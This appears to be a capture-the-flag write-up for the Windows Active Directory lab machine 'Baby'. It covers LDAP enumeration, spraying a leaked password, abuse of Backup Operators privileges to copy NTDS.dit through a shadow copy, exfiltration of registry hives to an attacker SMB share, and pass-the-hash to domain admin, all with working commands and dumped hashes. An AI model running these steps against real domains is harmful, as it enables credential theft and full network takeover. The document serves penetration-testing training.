
---

## title: "Baby" os: Windows difficulty: Easy tags: [active-directory, ldap, netexec, password-spray, kerberos, backup-operators, sebackupprivilege, diskshadow, ntds-dit, secretsdump, evil-winrm]

**Target:** 10.129.234.71 (baby.vl)

## Overview

Baby is an easy-difficulty Windows Active Directory machine. The foothold comes from anonymous LDAP enumeration, which leaks a default password in a user's description field, plus a second, non-obvious account that only turns up under a raw LDAP object query. That account is a member of **Backup Operators**, and abusing `SeBackupPrivilege` provides a path to dump the domain's NTDS database via a Volume Shadow Copy — yielding the domain Administrator hash and full compromise.

## Reconnaissance

![Nmap scan](assets/images/Pasted%20image%2020260805025050.png)

### Nmap

```shell
└─$ sudo nmap -sC -sV 10.129.234.71
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 16:49 CDT
Nmap scan report for 10.129.234.71
Host is up (0.053s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 02:48:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-08-04T02:35:32
|_Not valid after:  2027-02-03T02:35:32
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-05T02:48:10+00:00
|_ssl-date: 2026-08-05T02:48:51+00:00; +4h58m39s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h58m38s, deviation: 0s, median: 4h58m38s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-05T02:48:12
|_  start_date: N/A
```

The open port set (88, 389, 445, 464, 3268, 3389) is a classic Domain Controller signature — Kerberos, LDAP/Global Catalog, SMB, and kpasswd are all present. `rdp-ntlm-info` confirms the hostname `BabyDC` in the `baby.vl` domain, NetBIOS name `BABY`.

A significant clock skew (~5 hours) is flagged between the scanner and target. Since Kerberos is time-sensitive, this needs to be corrected before any Kerberos-based authentication will work.

## LDAP Enumeration & Credential Leak

Anonymous SMB login succeeded, but share listing and RID cycling were both denied — this DC has anonymous SMB more locked down than usual. LDAP was the more productive path.

```shell
└─$ netexec ldap 10.129.234.71 -u '' -p ''
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
```

The anonymous bind succeeded. Next, pulling the user list:

```shell
└─$ netexec ldap 10.129.234.71 -u '' -p '' --users
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 09:11:03 0
LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 09:11:03 0
LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 09:11:03 0
LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 09:11:03 0
LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 09:11:08 0
LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 09:11:08 0
LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 09:11:08 0
LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 09:14:37 0        Set initial password to BabyStart123!
```

`Teresa.Bell`'s description field leaks a plaintext password: **`BabyStart123!`** — a common HTB "easy box" pattern.

![LDAP credential leak](assets/images/Pasted%20image%2020260804224411.png)

### Password Spray — First Attempt

The user list was saved to `users.txt`, and the leaked password was tested against every account:

```shell
└─$ cat users.txt
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

None of the accounts — including Teresa.Bell herself — accepted the password over SMB or LDAP. Kerberos-based testing (via `kinit`) confirmed this cleanly with `KDC_ERR_PREAUTH_FAILED` (wrong password, not a lockout or account-state issue), ruling out config problems. This looked like a dead end.

> **Note on Kerberos tooling:** getting `kinit`/`kpasswd` working against the DC required fixing `/etc/hosts` and creating a proper `/etc/krb5.conf`:
> 
> ```shell
> └─$ sudo tee /etc/krb5.conf > /dev/null << 'EOF'
> [libdefaults]
>     default_realm = BABY.VL
>     dns_lookup_kdc = false
>     dns_lookup_realm = false
> 
> [realms]
>     BABY.VL = {
>         kdc = 10.129.234.71
>         admin_server = 10.129.234.71
>     }
> 
> [domain_realm]
>     .baby.vl = BABY.VL
>     baby.vl = BABY.VL
> EOF
> ```

### Finding the Missing User

A `--groups` enumeration turned up two custom groups worth investigating:

```shell
└─$ netexec ldap 10.129.234.71 -u '' -p '' --groups
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.234.71   389    BABYDC           [+] baby.vl\:
LDAP        10.129.234.71   389    BABYDC           Domain Computers                         membercount: 0
LDAP        10.129.234.71   389    BABYDC           Cert Publishers                          membercount: 0
LDAP        10.129.234.71   389    BABYDC           Domain Users                             membercount: 0
LDAP        10.129.234.71   389    BABYDC           Domain Guests                            membercount: 0
LDAP        10.129.234.71   389    BABYDC           Group Policy Creator Owners              membercount: 1
LDAP        10.129.234.71   389    BABYDC           RAS and IAS Servers                      membercount: 0
LDAP        10.129.234.71   389    BABYDC           Allowed RODC Password Replication Group  membercount: 0
LDAP        10.129.234.71   389    BABYDC           Denied RODC Password Replication Group   membercount: 8
LDAP        10.129.234.71   389    BABYDC           Enterprise Read-only Domain Controllers  membercount: 0
LDAP        10.129.234.71   389    BABYDC           Cloneable Domain Controllers             membercount: 0
LDAP        10.129.234.71   389    BABYDC           Protected Users                          membercount: 0
LDAP        10.129.234.71   389    BABYDC           DnsAdmins                                membercount: 0
LDAP        10.129.234.71   389    BABYDC           DnsUpdateProxy                           membercount: 0
LDAP        10.129.234.71   389    BABYDC           dev                                      membercount: 5
LDAP        10.129.234.71   389    BABYDC           it                                       membercount: 5
```

The `dev` and `it` groups each have 5 members, but the `--users` query only surfaced 9 people total (including Guest). That's a discrepancy worth chasing — **the `--users` convenience flag can silently omit accounts that lack certain populated attributes** (last-password-set date, bad-password count, etc.). A raw LDAP object dump avoids that filtering entirely:

```shell
└─$ netexec ldap 10.129.234.71 -u '' -p '' --query "(objectClass=*)" "" | grep "Response for object:"
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
...
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

**`Caroline Robinson`** is a real object in the `it` OU that never appeared in the earlier `--users` table, because she has no populated attributes for that flag to display.

### Password Spray — Success

Testing the leaked password against this newly-discovered account:

```shell
└─$ netexec smb 10.129.234.71 -u 'Caroline.Robinson' -p 'BabyStart123!'
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

`STATUS_PASSWORD_MUST_CHANGE` is a positive signal — the password is correct, but the account is flagged to require a change before normal authentication is allowed.

## Foothold as Caroline.Robinson

Impacket's `changepasswd.py` handles the required password change over SAMR:

```shell
└─$ impacket-changepasswd baby.vl/Caroline.Robinson:'BabyStart123!'@10.129.234.71 -newpass 'YourNewPass123!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of baby.vl\Caroline.Robinson
[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

![Password change success](assets/images/Pasted%20image%2020260805002745.png)

Verified the new credentials work:

```shell
└─$ netexec smb 10.129.234.71 -u 'Caroline.Robinson' -p 'YourNewPass123!'
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\Caroline.Robinson:YourNewPass123!
```

Connected over WinRM for a shell:

```shell
└─$ evil-winrm -i 10.129.234.71 -u 'Caroline.Robinson' -p 'YourNewPass123!'
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

![Evil-WinRM shell as Caroline.Robinson](assets/images/Pasted%20image%2020260805003158.png)

Grabbed the user flag:

```shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
67544137661c39a603e9be34c8144d2e
```

**User Flag:** `67544137661c39a603e9be34c8144d2e`

## Privilege Escalation

### Enumerating Privileges

```shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
...
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
```

```shell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Caroline is a member of **Backup Operators**, granting `SeBackupPrivilege` and `SeRestorePrivilege` — one of the most well-known Windows AD privilege escalation paths. `SeBackupPrivilege` allows reading any file on disk, bypassing normal ACLs, including protected registry hives and eventually the domain's `NTDS.dit` database.

### Dumping Registry Hives

First attempt: stand up an SMB listener on the attack box and have `reg.py` write the hive backups out over the network.

```shell
└─$ mkdir -p /tmp/hives
└─$ sudo impacket-smbserver share /tmp/hives -smb2support
```

```shell
└─$ impacket-reg baby.vl/Caroline.Robinson:'YourNewPass123!'@10.129.234.71 backup -o '\\10.10.15.87\share'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.10.15.87\share\SAM.save
```

Two of the three hives landed, but the transfer stalled on `SECURITY.save` and was interrupted:

```shell
└─$ ls -la /tmp/hives
total 4368
drwxrwxr-x  2 kali kali       80 Aug  5 00:56 .
drwxrwxrwt 15 root root      360 Aug  5 00:57 ..
-rwxr-xr-x  1 root root    28672 Aug  5 00:56 SAM.save
-rwxr-xr-x  1 root root 20791296 Aug  5 00:57 SYSTEM.save
```

`secretsdump.py` failed against these files (`read length must be non-negative or -1` — a hive parsing error), even though the file sizes and headers looked correct. Rather than keep debugging a possibly-corrupted network transfer, a cleaner approach: have the target save the hives to its own disk instead of streaming them over SMB, then pull them down through the existing WinRM session.

```shell
└─$ impacket-reg baby.vl/Caroline.Robinson:'YourNewPass123!'@10.129.234.71 backup -o 'C:\windows\temp'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\windows\temp\SAM.save
[*] Saved HKLM\SYSTEM to C:\windows\temp\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\windows\temp\SECURITY.save
```

All three saved cleanly this time. Downloaded through evil-winrm:

```shell
*Evil-WinRM* PS C:\windows\temp> download SAM.save
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> download SYSTEM.save
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> download SECURITY.save
Info: Download successful!
```

### Local Hash Dump

```shell
└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

This is the **local** built-in Administrator account (SID 500), not the **domain** Administrator — on a DC these are separate accounts entirely, and the local hash doesn't authenticate against the domain. Confirmed:

```shell
└─$ netexec smb 10.129.234.71 -u Administrator -H 8d992faed38128ae85e95fa35868bb43
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

As expected — the local hash is a dead end. The real target is `NTDS.dit`, the domain's AD database.

### Extracting NTDS.dit via Volume Shadow Copy

`NTDS.dit` is always open/locked by the AD DS process while Windows is running, so it can't be copied directly — even with `SeBackupPrivilege`. The workaround is a **Volume Shadow Copy**: a frozen, point-in-time snapshot of the whole `C:` drive, taken with the built-in `diskshadow` tool.

A `diskshadow` script was created locally:

```shell
└─$ cat backup.txt
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\baby.cab
add volume c: alias baby
create
expose %baby% e:
```

Converted to DOS line endings (Windows tools are picky about this) and uploaded via evil-winrm:

```shell
└─$ unix2dos backup.txt
unix2dos: converting file backup.txt to DOS format...
```

```shell
*Evil-WinRM* PS C:\programdata> upload backup.txt
Info: Uploading /home/kali/boxes/baby/backup.txt to C:\programdata\backup.txt
Info: Upload successful!
```

> **Gotcha:** uploading with a full destination path (`upload backup.txt C:\programdata\backup.txt`) while already in a different remote directory mangled the path into `C:\windows\temp\C:programdatabackup.txt`. `cd`-ing into the target directory first and uploading with just the filename avoided the issue.

Ran `diskshadow` against the script:

```shell
*Evil-WinRM* PS C:\programdata> diskshadow /s C:\programdata\backup.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  8/5/2026 7:24:49 AM

-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\baby.cab
-> add volume c: alias baby
-> create

Alias baby for shadow ID {3b6fc60d-7829-4997-88c1-ae570639a4f7} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {4649ef5b-59d4-450f-8bfe-e60db0262d45} set as environment variable.
...
-> expose %baby% e:
-> %baby% = {3b6fc60d-7829-4997-88c1-ae570639a4f7}
The shadow copy was successfully exposed as e:\.
```

The frozen snapshot is now mounted as `E:\` — a separate view of the disk, unaffected by the live lock on the running system's `C:\Windows\ntds\ntds.dit`. Copied the file out using `robocopy` in backup mode (`/b`, which relies on `SeBackupPrivilege` to bypass ACL restrictions):

```shell
*Evil-WinRM* PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, August 5, 2026 7:30:27 AM
   Source : E:\Windows\ntds\
     Dest : C:\programdata\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
------------------------------------------------------------------------------
100%
------------------------------------------------------------------------------
               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
```

Downloaded via evil-winrm:

```shell
*Evil-WinRM* PS C:\programdata> download ntds.dit
Info: Downloading C:\programdata\ntds.dit to ntds.dit
Info: Download successful!
```

## Domain Compromise

With `ntds.dit` and the previously-captured `SYSTEM.save`, `secretsdump.py` decrypts every domain account's credentials offline:

```shell
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM.save LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
[*] Cleaning up...
```

This is the full domain database dump, including the real domain **Administrator** NT hash: `ee4457ae59f1e3fbd764e33d9cef123d` — distinct from the earlier local Administrator hash.

![Domain hash dump](assets/images/Pasted%20image%2020260805023940.png)

Verified with netexec:

```shell
└─$ netexec smb 10.129.234.71 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```

Full domain admin confirmed. Shell as Administrator:

```shell
└─$ evil-winrm -i 10.129.234.71 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```shell
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
98b8db0cb1e823149038cf7fda9d0b2f
```

**Root Flag:** `98b8db0cb1e823149038cf7fda9d0b2f`

## Key Takeaways

- Anonymous LDAP binds are worth trying even when SMB null sessions are locked down — different protocols on the same DC can have inconsistent anonymous-access restrictions.
- Convenience enumeration flags (like netexec's `--users`) can silently omit objects that lack certain populated attributes. A raw `(objectClass=*)` query is a more thorough cross-check.
- `STATUS_PASSWORD_MUST_CHANGE` is a positive signal during a password spray, not a failure — it confirms the password is correct.
- Membership in **Backup Operators** grants `SeBackupPrivilege`/`SeRestorePrivilege`, which bypasses file ACLs entirely — a direct path to registry hives and, via a Volume Shadow Copy, the domain's `NTDS.dit`.